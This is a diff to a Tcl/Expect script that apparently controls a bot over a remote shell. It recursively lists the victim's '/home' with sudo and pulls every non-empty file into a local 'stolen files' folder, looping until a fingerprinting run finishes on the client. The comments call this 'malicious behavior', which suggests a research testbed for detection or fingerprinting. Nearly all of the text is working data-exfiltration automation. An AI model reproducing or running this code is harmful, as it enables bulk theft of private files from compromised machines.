@@ -4,8 +4,7 @@
 ############# CONFIGURATION ##########################
 
 # load the variables passed to the file
-set current_config [lindex $argv 0]
-set tick_port [lindex $argv 1]
+set tick_port [lindex $argv 0]
 
 # folder path of current file
 set SCRIPT_DIR [file dirname [file normalize $argv0]]
@@ -13,9 +12,10 @@ set CONFIG_FOLDER_PATH "$SCRIPT_DIR/../config"
 
 # load folder paths
 set tick_remote_shell_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$tick_remote_shell_folder"]
-set stolen_foles_storage_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$stolen_files_storage_folder"]
+set stolen_files_storage_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$stolen_files_storage_folder"]
 set client_config_folder [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$client_config_folder"]
 set anaconda_path [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$anaconda_location"]
+set root_of_application_on_server [exec bash -c "source \"$CONFIG_FOLDER_PATH/folder_paths.config\" && echo \$root_of_application_on_server"]
 
 ######################################################
 
@@ -36,111 +36,126 @@ expect "$ "
 # wait until bot has connected
 set timeout 35
 expect {
-    -re {Bot [0-9]+ \[[^\]]+\] connected from [0-9.]+} {
-        puts "\r✅ Bot connected.\r"
-	set timeout 10
-    }
-    timeout {
-        puts "\r❌ Timeout waiting for bot connection.\r"
-        exit 1
-    }
+	-re {Bot [0-9]+ \[[^\]]+\] connected from [0-9.]+} {
+		puts "\r✅ Bot connected.\r"
+			set timeout 10
+	}
+	timeout {
+		puts "\r❌ Timeout waiting for bot connection.\r"
+			exit 1
+	}
 }
 sleep 5
 set timeout 10
 
+
 # select bot 0 to work with
 send "\ruse 0\r"
-expect -re {\[.*\]}
+expect -re {\[Bot.+\]}
 
+
+# Procedure to pull files from remote system and store them locally
+proc file_pull {remote_storage_location local_storage_location} {
+
+	send "pull $remote_storage_location $local_storage_location\r"
+
+		# set custom timeout length to accustom long waits for file pulling
+		set timeout 100000 
+		expect {
+			-re {\[Bot.+\]} {
+				puts "ls output received"
+			}
+			timeout {
+				puts "Timeout"			
+			}
+		}
+}   
 
 # Procedure to list files and pull from a given absolute path
-proc traverse {dir stolen_files_folder} {
-    global client_config_folder
-    puts "\r==> Scanning directory: $dir\r"
-    
-    # Run `exec ls -l <dir>`
-    send "exec ls -l $dir\r"
-    set timeout 100000000000    
-    expect {
-    	-re {total(.*)\[.*\]} {
-		puts "matched output\n"
-		set output $expect_out(buffer);
-		puts "DEBUG: $expect_out(buffer)"
-	}
-    	timeout {
-        	puts "\rTimeout occurred\n"
-    	}
-    }
+# works recursively on directories
+proc traverse {dir stolen_files_folder config_folder_remote config_folder_local} {
+	global client_config_folder
+		puts "\r==> Scanning directory: $dir\r"
 
-    # Parse each line
-    set lines [split $output "\n"]
-    foreach line $lines {
-        if {[regexp {^total} $line] || $line eq ""} {
-            continue
-        }
-
-        set fields [regexp -all -inline {\S+} $line]
-        if {[llength $fields] < 9} {
-            continue
-        }
-
-        set perms [lindex $fields 0]
-        set size [lindex $fields 4]
-        set name [lindex $fields end]
-        set fullpath "$dir/$name"
-	puts "fullpath: $fullpath"
-	# check if the item is a directory (permissions start with d)
-	# if so recursively traverse folder
-        if {[string index $perms 0] eq "d"} {
-		set add_folder_to_stolen_files $stolen_files_folder$fullpath
-		file mkdir $add_folder_to_stolen_files
-        	traverse $fullpath $stolen_files_folder 
-        } elseif {[string index $perms 0] eq "l" || $size == 0} {
-		# skip if the file is linked or is empty --> leads to 'cannot stat' errors
-		continue		
-	}  else {
-            puts "\r-> Pulling file: $fullpath ($size bytes)\r"
-	    
-	    set save_to $stolen_files_folder$fullpath
-	    puts "save location: $save_to"
-            send "pull $fullpath $save_to\r"
-
-	    # set custom timeout length to accustom long waits for file pulling
-	    set timeout 1000000 
-            expect {
-		-re {\[Bot.*\]} {
-			puts "DEBUG: $expect_out(buffer)"
-	    }
-		timeout {
-			puts "Timeout"			
-	} }
-
-        }
-    
-	}    
-    # check if fp is finished
-    send "exec cat $client_config_folder/fp_done.flag\r"
-    set timeout 3
-    expect {
-		-re {fp finished successfully} {
-			puts "\rfingerprinting finished, stopping malicious behavior\r"
-			exit 0
+		# store output of ls command in file on client device
+		set ls_result_remote "$config_folder_remote/ls_result.txt" 
+		send "exec sudo ls -l $dir > $ls_result_remote\r"
+		set timeout 100000000000
+		expect {
+			-re {\[Bot.+\]} {
+				puts "matched output\n"
+			}
+			timeout {
+				puts "\rTimeout occurred\n"
+			}
 		}
-		timeout {
-			puts "\rfp still running \r"
-		}
-	}
+	sleep 5
 
+		# pull ls output file from client and store it locally
+		set ls_result_local "$config_folder_local/ls_result.txt"
+		file_pull $ls_result_remote $ls_result_local
+		sleep 3
+		set file [open $ls_result_local]
+		set output [read $file]
+
+		# cleanup files after having read data into memory
+		file delete $ls_result_local
+		send "rm $ls_result_remote\r"    
+		expect {
+			-re {\[Bot.+\]} {
+				puts "ls file removed\n"
+			}
+			timeout {
+				puts "\r Timeout occurred\n"
+			}
+		}
+
+	# Parse each line
+	set lines [split $output "\n"]
+		foreach line $lines {
+			if {[regexp {^total} $line] || $line eq ""} {
+				continue
+			}
+
+			set fields [regexp -all -inline {\S+} $line]
+				if {[llength $fields] < 9} {
+					continue
+				}
+
+			set perms [lindex $fields 0]
+				set size [lindex $fields 4]
+				set name [lindex $fields end]
+				set fullpath "$dir/$name"
+
+				# check if the item is a directory (permissions start with d)
+				# if so recursively traverse folder
+				if {[string index $perms 0] eq "d"} {
+					set add_folder_to_stolen_files $stolen_files_folder$fullpath
+						file mkdir $add_folder_to_stolen_files
+						traverse $fullpath $stolen_files_folder $config_folder_remote $config_folder_local
+				} elseif {[string index $perms 0] eq "l" || $size == 0} {
+				# skip if the file is linked or is empty --> leads to 'cannot stat' errors
+					continue		
+				}  else {
+
+					# pull file from client and store locally
+					puts "\r-> Pulling file: $fullpath ($size bytes)\r"	    
+						set save_to $stolen_files_folder$fullpath
+						file_pull $fullpath $save_to
+				}
+		}    
 }
+
+
 # runs indefinitely, script is stopped when fp has completed on client device
 while {1 > 0} {
- 	# the malicious behavior starts stealing data in the '/home' directory
+	# the malicious behavior starts stealing data in the '/home' directory
 	# to store the data the folders are mirrored on the server
 	set starting_folder "/home"
 	set first_stolen_folder $stolen_files_storage_folder$starting_folder
 	file mkdir $first_stolen_folder
-	
+
 	# start malicious behavior
-	traverse $starting_folder $stolen_files_storage_folder
+	traverse $starting_folder $stolen_files_storage_folder $client_config_folder "$root_of_application_on_server/config"
 }
 
